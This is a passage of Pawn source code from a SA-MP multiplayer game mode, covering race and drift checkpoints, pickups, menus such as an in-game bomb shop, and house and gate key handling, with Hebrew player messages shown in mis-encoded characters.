						if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(playerid,4,RacePositions_boats1[playerinfo[playerid][racecp]][0],RacePositions_boats1[playerinfo[playerid][racecp]][1],RacePositions_boats1[playerinfo[playerid][racecp]][2],RacePositions_boats1[playerinfo[playerid][racecp]][0],RacePositions_boats1[playerinfo[playerid][racecp]][1],RacePositions_boats1[playerinfo[playerid][racecp]][2],20.0);
						else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(playerid,4,RacePositions_boats2[playerinfo[playerid][racecp]][0],RacePositions_boats2[playerinfo[playerid][racecp]][1],RacePositions_boats2[playerinfo[playerid][racecp]][2],RacePositions_boats2[playerinfo[playerid][racecp]][0],RacePositions_boats2[playerinfo[playerid][racecp]][1],RacePositions_boats2[playerinfo[playerid][racecp]][2],20.0);
						else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(playerid,4,RacePositions_boats3[playerinfo[playerid][racecp]][0],RacePositions_boats3[playerinfo[playerid][racecp]][1],RacePositions_boats3[playerinfo[playerid][racecp]][2],RacePositions_boats3[playerinfo[playerid][racecp]][0],RacePositions_boats3[playerinfo[playerid][racecp]][1],RacePositions_boats3[playerinfo[playerid][racecp]][2],20.0);
					}
				}
			}
			else
			{
				switch(raceinfo[4])
				{
					case race1_cars, race5_crazy:
					{
						if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(playerid,0,RacePositions_cars1[playerinfo[playerid][racecp]][0],RacePositions_cars1[playerinfo[playerid][racecp]][1],RacePositions_cars1[playerinfo[playerid][racecp]][2],RacePositions_cars1[playerinfo[playerid][racecp]+1][0],RacePositions_cars1[playerinfo[playerid][racecp]][1],RacePositions_cars1[playerinfo[playerid][racecp]+1][2],20.0);
						else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(playerid,0,RacePositions_cars2[playerinfo[playerid][racecp]][0],RacePositions_cars2[playerinfo[playerid][racecp]][1],RacePositions_cars2[playerinfo[playerid][racecp]][2],RacePositions_cars2[playerinfo[playerid][racecp]+1][0],RacePositions_cars2[playerinfo[playerid][racecp]][1],RacePositions_cars2[playerinfo[playerid][racecp]+1][2],20.0);
						else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(playerid,0,RacePositions_cars3[playerinfo[playerid][racecp]][0],RacePositions_cars3[playerinfo[playerid][racecp]][1],RacePositions_cars3[playerinfo[playerid][racecp]][2],RacePositions_cars3[playerinfo[playerid][racecp]+1][0],RacePositions_cars3[playerinfo[playerid][racecp]][1],RacePositions_cars3[playerinfo[playerid][racecp]+1][2],20.0);
					}
					case race2_bikes:
					{
						if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(playerid,0,RacePositions_bikes1[playerinfo[playerid][racecp]][0],RacePositions_bikes1[playerinfo[playerid][racecp]][1],RacePositions_bikes1[playerinfo[playerid][racecp]][2],RacePositions_bikes1[playerinfo[playerid][racecp]+1][0],RacePositions_bikes1[playerinfo[playerid][racecp]+1][1],RacePositions_bikes1[playerinfo[playerid][racecp]+1][2],20.0);
						else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(playerid,0,RacePositions_bikes2[playerinfo[playerid][racecp]][0],RacePositions_bikes2[playerinfo[playerid][racecp]][1],RacePositions_bikes2[playerinfo[playerid][racecp]][2],RacePositions_bikes2[playerinfo[playerid][racecp]+1][0],RacePositions_bikes2[playerinfo[playerid][racecp]+1][1],RacePositions_bikes2[playerinfo[playerid][racecp]+1][2],20.0);
						else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(playerid,0,RacePositions_bikes3[playerinfo[playerid][racecp]][0],RacePositions_bikes3[playerinfo[playerid][racecp]][1],RacePositions_bikes3[playerinfo[playerid][racecp]][2],RacePositions_bikes3[playerinfo[playerid][racecp]+1][0],RacePositions_bikes3[playerinfo[playerid][racecp]+1][1],RacePositions_bikes3[playerinfo[playerid][racecp]+1][2],20.0);
					}
					case race3_planes:
					{
						if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(playerid,3,RacePositions_planes1[playerinfo[playerid][racecp]][0],RacePositions_planes1[playerinfo[playerid][racecp]][1],RacePositions_planes1[playerinfo[playerid][racecp]][2],RacePositions_planes1[playerinfo[playerid][racecp]+1][0],RacePositions_planes1[playerinfo[playerid][racecp]+1][1],RacePositions_planes1[playerinfo[playerid][racecp]+1][2],20.0);
						else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(playerid,3,RacePositions_planes2[playerinfo[playerid][racecp]][0],RacePositions_planes2[playerinfo[playerid][racecp]][1],RacePositions_planes2[playerinfo[playerid][racecp]][2],RacePositions_planes2[playerinfo[playerid][racecp]+1][0],RacePositions_planes2[playerinfo[playerid][racecp]+1][1],RacePositions_planes2[playerinfo[playerid][racecp]+1][2],20.0);
						else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(playerid,3,RacePositions_planes3[playerinfo[playerid][racecp]][0],RacePositions_planes3[playerinfo[playerid][racecp]][1],RacePositions_planes3[playerinfo[playerid][racecp]][2],RacePositions_planes3[playerinfo[playerid][racecp]+1][0],RacePositions_planes3[playerinfo[playerid][racecp]+1][1],RacePositions_planes3[playerinfo[playerid][racecp]+1][2],20.0);
					}
					case race4_boats:
					{
						if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(playerid,3,RacePositions_boats1[playerinfo[playerid][racecp]][0],RacePositions_boats1[playerinfo[playerid][racecp]][1],RacePositions_boats1[playerinfo[playerid][racecp]][2],RacePositions_boats1[playerinfo[playerid][racecp]+1][0],RacePositions_boats1[playerinfo[playerid][racecp]+1][1],RacePositions_boats1[playerinfo[playerid][racecp]+1][2],20.0);
						else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(playerid,3,RacePositions_boats2[playerinfo[playerid][racecp]][0],RacePositions_boats2[playerinfo[playerid][racecp]][1],RacePositions_boats2[playerinfo[playerid][racecp]][2],RacePositions_boats2[playerinfo[playerid][racecp]+1][0],RacePositions_boats2[playerinfo[playerid][racecp]+1][1],RacePositions_boats2[playerinfo[playerid][racecp]+1][2],20.0);
						else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(playerid,3,RacePositions_boats3[playerinfo[playerid][racecp]][0],RacePositions_boats3[playerinfo[playerid][racecp]][1],RacePositions_boats3[playerinfo[playerid][racecp]][2],RacePositions_boats3[playerinfo[playerid][racecp]+1][0],RacePositions_boats3[playerinfo[playerid][racecp]+1][1],RacePositions_boats3[playerinfo[playerid][racecp]+1][2],20.0);
					}
				}
			}
			if(IsPlayerInAnyVehicle(playerid)) RepairVehicle(GetPlayerVehicleID(playerid));
			playerinfo[playerid][racecp]++;
		}
		#pragma unused maxcp
	}
	if(playerinfo[playerid][insrace])
	{
		DisablePlayerRaceCheckpoint(playerid);
		if(playerinfo[playerid][sracecp] == sizeof(SRacePositions)-1)
		{
			sraceinfo[1]--;
			playerinfo[playerid][sracecp] = 0, playerinfo[playerid][insrace] = 0, playerinfo[playerid][waitsrace] = 0;
			playerinfo[playerid][inact] = 0;
			SetPlayerVirtualWorld(playerid,world_normal);
			SpawnPlayer(playerid);
			if(sraceinfo[4] == 3)
			{
				sraceinfo[4]--;
				format(string,sizeof(string)," !ðéöç áîéøåõ äîéåçã áî÷åí øàùåï %s",GetName(playerid));
				SendClientMessageToAll(orange,string);
				GiveMoney(playerid,50000);
				format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~y~~h~~h~srace~w~!",GetName(playerid));
				MovingText(string,mt_activity);
			}
			else if(sraceinfo[4] == 2)
			{
				sraceinfo[4]--;
				format(string,sizeof(string)," !ðéöç áîéøåõ äîéåçã áî÷åí ùðé %s",GetName(playerid));
				SendClientMessageToAll(orange,string);
				GiveMoney(playerid,25000);
			}
			else if(sraceinfo[4] == 1)
			{
				sraceinfo[4]--;
				format(string,sizeof(string)," !ðéöç áîéøåõ äîéåçã áî÷åí ùìéùé %s",GetName(playerid));
				SendClientMessageToAll(orange,string);
				GiveMoney(playerid,10000);
				SendClientMessageToAll(orange," .äîéøåõ äîéåçã äñúééí");
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(IsPlayerConnected(i) && (playerinfo[i][insrace] || playerinfo[i][waitsrace]))
					{
						playerinfo[i][insrace] = 0, playerinfo[i][waitsrace] = 0, playerinfo[i][sracecp] = 0;
						playerinfo[i][inact] = 0;
						SetPlayerInterior(i,0);
						SpawnPlayer(i);
						SetPlayerVirtualWorld(i,world_normal);
						DisablePlayerRaceCheckpoint(i);
					}
				}
				sraceinfo[0] = 0, sraceinfo[1] = 0, sraceinfo[2] = 0;
			}
		}
		else
		{
			if(playerinfo[playerid][sracecp] == (sizeof(SRacePositions)-2)) SetPlayerRaceCheckpoint(playerid,SRacePositions[playerinfo[playerid][sracecp]][srType] == 1? 1:4,SRacePositions[playerinfo[playerid][sracecp]][srX],SRacePositions[playerinfo[playerid][sracecp]][srY],SRacePositions[playerinfo[playerid][sracecp]][srZ],SRacePositions[playerinfo[playerid][sracecp]][srX],SRacePositions[playerinfo[playerid][sracecp]][srY],SRacePositions[playerinfo[playerid][sracecp]][srZ],20.0);
			else SetPlayerRaceCheckpoint(playerid,SRacePositions[playerinfo[playerid][sracecp]][srType] == 1? 0:3,SRacePositions[playerinfo[playerid][sracecp]][srX],SRacePositions[playerinfo[playerid][sracecp]][srY],SRacePositions[playerinfo[playerid][sracecp]][srZ],SRacePositions[playerinfo[playerid][sracecp]+1][srX],SRacePositions[playerinfo[playerid][sracecp]+1][srY],SRacePositions[playerinfo[playerid][sracecp]+1][srZ],20.0);
			playerinfo[playerid][sracecp]++;
		}
	}
	if(playerinfo[playerid][indrift])
	{
		new bool:win=false;
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && (i == playerid || i == playerinfo[playerid][dinvited]))
			{
				DisablePlayerRaceCheckpoint(i);
				new size = 0;
				if(playerinfo[i][dplace] == 1) size = sizeof(DriftPositions_1);
				else if(playerinfo[i][dplace] == 2) size = sizeof(DriftPositions_2);
				else if(playerinfo[i][dplace] == 3) size = sizeof(DriftPositions_3);
				if(playerinfo[i][driftcp] == (size-1))
				{
					SetPlayerVirtualWorld(i,world_normal);
					SetVehicleVirtualWorld(GetPlayerVehicleID(i),world_normal);
					DisablePlayerRaceCheckpoint(i);
					win = true;
				}
				else if(playerinfo[i][driftcp] == (size-2))
				{
					if(playerinfo[i][dplace] == 1) SetPlayerRaceCheckpoint(i,1,DriftPositions_1[playerinfo[i][driftcp]][0],DriftPositions_1[playerinfo[i][driftcp]][1],DriftPositions_1[playerinfo[i][driftcp]][2],DriftPositions_1[playerinfo[i][driftcp]][0],DriftPositions_1[playerinfo[i][driftcp]][1],DriftPositions_1[playerinfo[i][driftcp]][2],14.5);
					else if(playerinfo[i][dplace] == 2) SetPlayerRaceCheckpoint(i,1,DriftPositions_2[playerinfo[i][driftcp]][0],DriftPositions_2[playerinfo[i][driftcp]][1],DriftPositions_2[playerinfo[i][driftcp]][2],DriftPositions_2[playerinfo[i][driftcp]][0],DriftPositions_2[playerinfo[i][driftcp]][1],DriftPositions_2[playerinfo[i][driftcp]][2],14.5);
					else if(playerinfo[i][dplace] == 3) SetPlayerRaceCheckpoint(i,1,DriftPositions_3[playerinfo[i][driftcp]][0],DriftPositions_3[playerinfo[i][driftcp]][1],DriftPositions_3[playerinfo[i][driftcp]][2],DriftPositions_3[playerinfo[i][driftcp]][0],DriftPositions_3[playerinfo[i][driftcp]][1],DriftPositions_3[playerinfo[i][driftcp]][2],14.5);
					playerinfo[i][driftcp]++;
				}
				else
				{
					if(playerinfo[i][dplace] == 1) SetPlayerRaceCheckpoint(i,0,DriftPositions_1[playerinfo[i][driftcp]][0],DriftPositions_1[playerinfo[i][driftcp]][1],DriftPositions_1[playerinfo[i][driftcp]][2],DriftPositions_1[playerinfo[i][driftcp]+1][0],DriftPositions_1[playerinfo[i][driftcp]+1][1],DriftPositions_1[playerinfo[i][driftcp]+1][2],14.5);
					else if(playerinfo[i][dplace] == 2) SetPlayerRaceCheckpoint(i,0,DriftPositions_2[playerinfo[i][driftcp]][0],DriftPositions_2[playerinfo[i][driftcp]][1],DriftPositions_2[playerinfo[i][driftcp]][2],DriftPositions_2[playerinfo[i][driftcp]+1][0],DriftPositions_2[playerinfo[i][driftcp]+1][1],DriftPositions_2[playerinfo[i][driftcp]+1][2],14.5);
					else if(playerinfo[i][dplace] == 3) SetPlayerRaceCheckpoint(i,0,DriftPositions_3[playerinfo[i][driftcp]][0],DriftPositions_3[playerinfo[i][driftcp]][1],DriftPositions_3[playerinfo[i][driftcp]][2],DriftPositions_3[playerinfo[i][driftcp]+1][0],DriftPositions_3[playerinfo[i][driftcp]+1][1],DriftPositions_3[playerinfo[i][driftcp]+1][2],14.5);
					playerinfo[i][driftcp]++;
				}
			}
		}
		if(win)
		{
			GiveMoney(playerid,playerinfo[playerid][bet]);
			format(string,sizeof(string),"  !áãøéôè %s ðéöç àú %s",GetName(playerinfo[playerid][dinvited]),GetName(playerid));
			SendClientMessageToAll(orange,string);
			playerinfo[playerinfo[playerid][dinvited]][driftcp] = 0,
			playerinfo[playerinfo[playerid][dinvited]][indrift] = 0,
			playerinfo[playerinfo[playerid][dinvited]][bet] = 0,
			playerinfo[playerinfo[playerid][dinvited]][dinviter] = 0,
			playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1;
			playerinfo[playerid][driftcp] = 0,
			playerinfo[playerid][indrift] = 0,
			playerinfo[playerid][bet] = 0,
			playerinfo[playerid][dinviter] = 0,
			playerinfo[playerid][dinvited] = -1;
		}
	}
	if(debugstate) printf("OnPlayerEnterRaceCheckpoint(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerLeaveRaceCheckpoint]================================================
public OnPlayerLeaveRaceCheckpoint(playerid)
{
	if(debugstate) printf("OnPlayerLeaveRaceCheckpoint(%s(%d)) start",GetName(playerid),playerid);
	if(debugstate) printf("OnPlayerLeaveRaceCheckpoint(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerPickUpPickup]=======================================================
public OnPlayerPickUpPickup(playerid, pickupid)
{
	if(debugstate) printf("OnPlayerPickUpPickup(%s(%d),%d) start",GetName(playerid),playerid,pickupid);
	switch(pickupinfo[pickupid][pmodel])
	{
		case 1240: playerinfo[playerid][lasthealth] = 100.0;
		case 1242: playerinfo[playerid][lastarmour] = 100.0;
		case 370: playerinfo[playerid][jetpack] = 1;
		case 331, 333..339, 321..326, 341..353, 355..369, 371, 372: UpdatePlayerWeapons(playerid);
	}
	if(pickupinfo[pickupid][pfunc] >= 1)
	{
	    PlayerPlaySound(playerid,1050,0.0,0.0,0.0);
		switch(pickupinfo[pickupid][pfunc])
		{
			case 1:
			{
				playerinfo[playerid][propertyid] = pprop(playerid);
				if(playerinfo[playerid][propertyid] != -1)
				{
					new string[M_S], p = playerinfo[playerid][propertyid];
					format(string,sizeof(string)," ~~~ :%s áøåê äáà ì ~~~",propinfo[p][pname]);
					SendClientMessage(playerid,lightblue,string);
					if(propinfo[p][owner] == playerid) SendClientMessage(playerid,yellow," /sell :äðëñ äæä ùééê ìê, ìîëéøúå");
					else
					{
						if(propinfo[p][owner] == INVALID_PLAYER_ID) SendClientMessage(playerid,yellow," /buy :äðëñ äæä ìà ùééê ìàó àçã. ì÷ðééúå");
						else
						{
							format(string,sizeof(string)," /buy :ì÷ðééúå .%s äðëñ äæä ùééê ì",GetName(propinfo[p][owner]));
							SendClientMessage(playerid,yellow,string);
						}
						format(string,sizeof(string)," .äðëñ äæä òåìä %d$ åðéúï ìäøååéç îîðå %d$ áëì ùúé ã÷åú",propinfo[p][pcost],propinfo[p][pearning]);
						SendClientMessage(playerid,yellow,string);
					}
					format(string,sizeof(string)," .îñôø äðëñ äæä äåà %d",p);
					SendClientMessage(playerid,yellow,string);
					SendClientMessage(playerid,yellow,"/prophelp :ìîéãò òì äðëñéí");
				}
			}
			case 2: SendClientMessage(playerid,darkblue," /bankhelp :ìîéãò òì äáð÷");
			case 3: SendClientMessage(playerid,darkblue," /ammuhelp :ìîéãò òì çðåú äðù÷éí");
			case 4: SendClientMessage(playerid,darkblue," /moneyhelp :ìîéãò òì àéæåøé äëñó");
			case 5: SendClientMessage(playerid,darkblue," /wanghelp :ìîéãò òì îåñê ååàðâ");
			case 6: SendClientMessage(playerid,darkblue," /racehelp :ìîéãò òì îòøëú äîéøåöéí");
			case 7: SendClientMessage(playerid,darkblue," /vehiclehelp :ìîéãò òì çðåú äîëåðéåú");
			case 8:
			{
				playerinfo[playerid][houseid] = phouse(playerid);
				if(playerinfo[playerid][houseid] != -1)
				{
					new string[M_S], f[M_S], h = playerinfo[playerid][houseid];
					format(f,sizeof(f),"/DM/Houses/%d.ini",h);
					SendClientMessage(playerid,lightblue," ~~~ :áøåê äáà ìáéú ~~~");
					CheckHouseAcc(playerid,h);
					if(playerinfo[playerid][houseacc][h])
					{
						format(string,sizeof(string)," .åéù ìê âéùä àìéå %s äáéú äæä ùééê ì",fgetstring(f,"Owner"));
						SendClientMessage(playerid,yellow,playerinfo[playerid][house] == h? (" /house :äáéú äæä ùééê ìê. ìôòåìåú äáéú"):(string));
						GameTextForPlayer(playerid,"~g~press ~r~~k~~PED_JUMPING~ ~g~to enter the house",2000,5);
					}
					else
					{
						if(equal(fgetstring(f,"Owner"),"None")) format(string,sizeof(string),GetMoney(playerid) >= houseinfo[h][hcost]? (" /buyhouse :äáéú äæä ìà ùééê ìàó àçã. éù ìê îñôé÷ ëñó ì÷ðééúå (%d$), ì÷ðééä") : (" .äáéú äæä ìà ùééê ìàó àçã, àê àéï ìê îñôé÷ ëñó (%d$) åìëï ìà úåëì ì÷ðåú àåúå"),houseinfo[h][hcost]);
						else format(string,sizeof(string)," .åàéï ìê âéùä ìäëðñ àìéå %s äáéú äæä ùééê ì",fgetstring(f,"Owner"));
						SendClientMessage(playerid,yellow,string);
					}
					new sizename[12];
					switch(houseinfo[h][hsize])
					{
						case 1: sizename = "÷èï - 1";
						case 2: sizename = "áéðåðé - 2";
						case 3: sizename = "âãåì - 3";
					}
					format(string,sizeof(string)," (îñôø áéú: %d | îçéø: %d$ | âåãì: %s) /houseshelp :ìîéãò òì äáúéí",h,houseinfo[h][hcost],sizename);
					SendClientMessage(playerid,yellow,string);
				}
			}
		}
	}
	if(debugstate) printf("OnPlayerPickUpPickup(%s(%d),%d) end",GetName(playerid),playerid,pickupid);
	return 1;
}
//=[OnPlayerSelectedMenuRow]====================================================
public OnPlayerSelectedMenuRow(playerid, row)
{
	if(debugstate) printf("OnPlayerSelectedMenuRow(%s(%d),%d) start",GetName(playerid),playerid,row);
	new string[M_S];
	if(GetPlayerMenu(playerid) == bombshop)
	{
		switch(row)
		{
			case 0:
			{
				SendClientMessage(playerid,lightblue," ~~~ :îéãò ôööåú ~~~");
				SendClientMessage(playerid,brown," (Number. Bomb name [Cost, Level])");
				for(new i=1;i<12;i++)
				{
					if(bombinfo[i][bValid])
					{
						format(string,sizeof(string)," %d. %s [%d$, %d]",i,bombinfo[i][bName],bombinfo[i][bCost],bombinfo[i][bLevel]);
						SendClientMessage(playerid,yellow,string);
					}
				}
			}
			default:
			{
				if(playerinfo[playerid][level] < bombinfo[row][bLevel])
				{
					SendClientMessage(playerid,red," .äøîä ùìê ðîåëä îãé ì÷ðééú äôööä äæå");
					SetFreeze(playerid,0);
					return 1;
				}
				if(GetMoney(playerid) < bombinfo[row][bCost])
				{
					SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó ì÷ðééú äôööä äæå");
					SetFreeze(playerid,0);
					return 1;
				}
				playerinfo[playerid][bomb] = row;
				GiveMoney(playerid,0-bombinfo[row][bCost]);
				format(string,sizeof(string)," !\"%s\" ÷ðéú àú äôööä",bombinfo[row][bName]);
				SendClientMessage(playerid,green,string);
			}
		}
	}
	if(GetPlayerMenu(playerid) == areYouSure[0] && !row)
	{
		ResetMoney(playerid);
		SendClientMessage(playerid,green," .îç÷ú àú ëñôê");
	}
	if(GetPlayerMenu(playerid) == areYouSure[1] && !row)
	{
		ResetWeapons(playerid);
		for(new i=0;i<10;i++)
		{
			playerinfo[playerid][weapons][i] = 0;
			if(playerinfo[playerid][logged])
			{
				format(string,sizeof(string),"Weapon%d",i);
				fsetint(fuser(playerid),string,0);
			}
			if(i < 8)
			{
				if(playerinfo[playerid][logged])
				{
					format(string,sizeof(string),"Ammo%d",i);
					fsetint(fuser(playerid),string,0);
				}
				playerinfo[playerid][ammo][i] = 0;
			}
		}
		SendClientMessage(playerid,green," .îç÷ú àú ðù÷éê");
	}
	if(GetPlayerMenu(playerid) == areYouSure[2] && !row)
	{
		playerinfo[playerid][bacc] = 0, playerinfo[playerid][bank] = 0;
		fsetint(fuser(playerid),"BankAccount",0);
		fsetint(fuser(playerid),"BankCash",0);
		SendClientMessage(playerid,green," .îç÷ú àú çùáåï äáð÷ ùìê");
	}
	if(GetPlayerMenu(playerid) == shootingMenu)
	{
		SetPlayerPos(playerid,Shooting[row][0],Shooting[row][1],Shooting[row][2]);
		SetPlayerFacingAngle(playerid,Shooting[row][3]);
		SetPlayerInterior(playerid,0);
		SetPlayerCheckpoint(playerid,Shooting[row][4],Shooting[row][5],Shooting[row][6],6.5);
		playerinfo[playerid][inshooting] = row;
		SavePlayerWeapons(playerid);
		ResetPlayerWeapons(playerid);
		GiveWeapon(playerid,46,0);
		format(string,sizeof(string)," ~~~ :áøåëéí äáàéí ìàéæåø ÷ìéòä ìîèøä îñôø #%d ~~~",row + 1);
		SendClientMessage(playerid,lightblue,string);
		SendClientMessage(playerid,yellow," .(òìéê ì÷ôåõ îäî÷åí áå àúä ðîöà åìöðåç àì äîòâì äàãåí (äö'÷ôåéðè");
		SendClientMessage(playerid,yellow," .áîéãä åúöìéç, úæëä á 3000$");
		SendClientMessage(playerid,green," !áäöìçä");
		SetPlayerVirtualWorld(playerid,world_shooting);
	}
	SetFreeze(playerid,0);
	if(debugstate) printf("OnPlayerSelectedMenuRow(%s(%d),%d) end",GetName(playerid),playerid,row);
	return 1;
}
//=[OnPlayerExitedMenu]=========================================================
public OnPlayerExitedMenu(playerid)
{
	if(debugstate) printf("OnPlayerExitedMenu(%s(%d)) start",GetName(playerid),playerid);
	SetFreeze(playerid,0);
	if(debugstate) printf("OnPlayerExitedMenu(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerKeyStateChange]=====================================================
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	//if(debugstate) printf("OnPlayerKeyStateChange(%s(%d),%d,%d) start",GetName(playerid),playerid,newkeys,oldkeys);
	//if(newkeys == KEY_ACTION) TextDrawHideForPlayer(playerid,modetxt);
	//if(oldkeys == KEY_ACTION && newkeys == 0) TextDrawShowForPlayer(playerid,modetxt); Fixed in 0.2.2 R3
	new string[M_S];
	if(((newkeys & KEY_FIRE) == KEY_FIRE || (newkeys & 128) == 128) && (GetPlayerCheckpoint(playerid) == cp_bank || GetPlayerCheckpoint(playerid) == cp_ammu) && playerinfo[playerid][spectate] == -1 && GetPlayerInterior(playerid) != 0 && !IsPlayerMAdmin(playerid))
	{
		SetPlayerHealth2(playerid,0.0);
		SendClientMessage(playerid,red,GetPlayerCheckpoint(playerid) == cp_bank? (" !àéï ìú÷åó àå ìàééí ááð÷"):(" !àéï ìú÷åó àå ìàééí áçðåú ðù÷"));
	}
	if(newkeys & KEY_FIRE)
	{
		/*for(new aka=0;aka<sizeof(AntiKillAreas);aka++)
		{
			if(IsPlayerInArea(playerid,AntiKillAreas[aka][0],AntiKillAreas[aka][1],AntiKillAreas[aka][2],AntiKillAreas[aka][3]) && (GetPlayerWeapon(playerid) >= 0 && GetPlayerWeapon(playerid) <= 43) && !IsPlayerInAnyVehicle(playerid))
			{
				SendClientMessage(playerid,red," !àéï ìú÷åó áàéæåø æä");
				SetPlayerHealth2(playerid,0.0);
			}
		}*/
		for(new i = 0; i < sizeof(Teleports); i++)
		{
			if(Teleports[i][Tnoshooting] && IsPlayerNearTeleport(playerid,Teleports[i][Tcmd],40.0))
			{
				SetPlayerArmedWeapon(playerid,playerinfo[playerid][weapons][8] != 0 ? 1 : 0);
				SetFreeze(playerid,0);
				PlayerPlaySound(playerid,1085,0.0,0.0,0.0);
			}
		}
	}
	if(newkeys == KEY_SECONDARY_ATTACK)
	{
		new Float:p[3], vehicleID;
		if(!IsPlayerInAnyVehicle(playerid))
		{
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			GetVehicleWithinDistance(playerid,p[0],p[1],p[2],20.0,vehicleID);
			if(IsVehicleRcOrTram(vehicleID)) PutPlayerInVehicle(playerid,vehicleID,0);
		}
		else
		{
			vehicleID = GetPlayerVehicleID(playerid);
			if(IsVehicleRcOrTram(vehicleID) || GetVehicleModel(vehicleID) == 594)
			{
				if(GetVehicleModel(vehicleID) != 449)
				{
			   	 	GetPlayerPos(playerid,p[0],p[1],p[2]);
					SetPlayerPos(playerid, p[0]+0.5,p[1],p[2]+1.0);
				}
			}
			SetCameraBehindPlayer(playerid);
		}
	}
	if(newkeys & KEY_JUMP)
	{
		playerinfo[playerid][houseid] = phouse(playerid);
		if(playerinfo[playerid][houseid] != -1)
		{
			new f[M_S], h = playerinfo[playerid][houseid];
			format(f,sizeof(f),"/DM/Houses/%d.ini",h);
			CheckHouseAcc(playerid,h);
			if(playerinfo[playerid][houseacc][h])
			{
				new world = -1;
				for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][inhouse] == h) world = i;
				if(world == -1) world = GetEmptyWorld();
				if(world == -1) return SendClientMessage(playerid,red," .ìà äéä ðéúï ìäëðéñ àåúê ìáéú, àðà ðñä ùåá îàåçø éåúø");
				SetPlayerVirtualWorld(playerid,world);
				playerinfo[playerid][inhouse] = h;
				if(houseinfo[h][hsize] == 1)
				{
					SetPlayerPos(playerid,2233.6055,-1114.5101,1050.8828);
					SetPlayerFacingAngle(playerid,355.4648);
					SetPlayerInterior(playerid,5);
				}
				else if(houseinfo[h][hsize] == 2)
				{
					SetPlayerPos(playerid,2318.6809,-1025.7518,1050.2109);
					SetPlayerFacingAngle(playerid,342.8408);
					SetPlayerInterior(playerid,9);
				}
				else if(houseinfo[h][hsize] == 3)
				{
					SetPlayerPos(playerid,2194.6960,-1202.7327,1049.0234);
					SetPlayerFacingAngle(playerid,100.4197);
					SetPlayerInterior(playerid,6);
				}
				SendClientMessage(playerid,yellow," .ðëðñú àì äáéú; ìçõ ùåá òì î÷ù äéöéàä îøëá òì îðú ìöàú îîðå");
				GameTextForPlayer(playerid,"~g~press ~r~~k~~VEHICLE_ENTER_EXIT~ ~g~to quit from the house",2000,5);
			}
		}
	}
	if(newkeys & KEY_SECONDARY_ATTACK && playerinfo[playerid][inhouse] > -1)
	{
		SetPlayerPos(playerid,houseinfo[playerinfo[playerid][inhouse]][hx],houseinfo[playerinfo[playerid][inhouse]][hy],houseinfo[playerinfo[playerid][inhouse]][hz]);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		playerinfo[playerid][inhouse] = -1;
	}
	if(newkeys & KEY_HORN && playerinfo[playerid][clan] > 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		new theGate = -1;
		for(new i=0;i<max_objects;i++)
		{
			if(GetPlayerDistanceToPoint(playerid,objectinfo[i][opos][0],objectinfo[i][opos][1]) <= 14.0 && objectinfo[i][omoving][0])
			{
				theGate = i;
				break;
			}
		}
		if((theGate == -1 || (objectinfo[theGate][omoving][1] != playerinfo[playerid][clan] && !claninfo[playerinfo[playerid][clan]][cpeace][objectinfo[theGate][omoving][1]])) && !playerinfo[playerid][clanmanager]) return 1;
		StopObject(theGate);
		if(!objectinfo[theGate][omoving][2])
		{
			MoveSObject(theGate,objectinfo[theGate][omoveto][0],objectinfo[theGate][omoveto][1],objectinfo[theGate][omoveto][2],3.5);
			objectinfo[theGate][omoving][2] = 1;
		}
		else
		{
			MoveSObject(theGate,objectinfo[theGate][opos][0],objectinfo[theGate][opos][1],objectinfo[theGate][opos][2],3.5);
			objectinfo[theGate][omoving][2] = 0;
		}
		return 1;
	}
	if(playerinfo[playerid][modeafk] && !playerinfo[playerid][usedafk])
	{
		command(playerid,"/unafk");
		playerinfo[playerid][modeafk] = 0;
	}
	if(playerinfo[playerid][underearth])
	{
	    new Float:p[4];
	    SetFreeze(playerid,0);
	    GetPlayerPos(playerid,p[0],p[1],p[2]);
	    SetPlayerPos(playerid,p[0],p[1],p[2] + 6.0);
	    playerinfo[playerid][underearth] = 0;
	    DisablePlayerCheckpoint(playerid);
	    SetCameraBehindPlayer(playerid);
	    for(new i = 0; i < MAX_PLAYERS; i++) if(GetPlayerDistanceToPointEx(i,p[0],p[1],p[2] + 4.0) <= 5.5)
	    {
	        PlayerPlaySound(i,1159,0.0,0.0,0.0);
	        if(i != playerid)
	        {
	            format(string,sizeof(string)," !ééöà îúåê äàãîä åú÷ó àåúê %s",GetName(playerid));
	        	SendClientMessage(i,red,string);
	        	Damage(i,50.0);
	        }
	    }
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && playerinfo[playerid][dmzone] == dmz_none && !playerinfo[playerid][inact] && !GetPlayerInterior(playerid))
	{
		if(playerinfo[playerid][upower] != -1)
		{
		    if(newkeys == KEY_SPRINT + KEY_WALK)
		    {
		    	format(string,sizeof(string)," ...(îúçéì ìèòåï ëåç àåìèéîèéáé (%s",UltimatePowers[playerinfo[playerid][upower]][upTitle]);
		    	SendClientMessage(playerid,green,string);
		    	playerinfo[playerid][charge] = 1;
		    	SetPlayerChatBubble(playerid,"...éåöø ëåç àåìèéîèéáé",red,2.0,3000);
		    }
		    if(oldkeys == KEY_SPRINT + KEY_WALK)
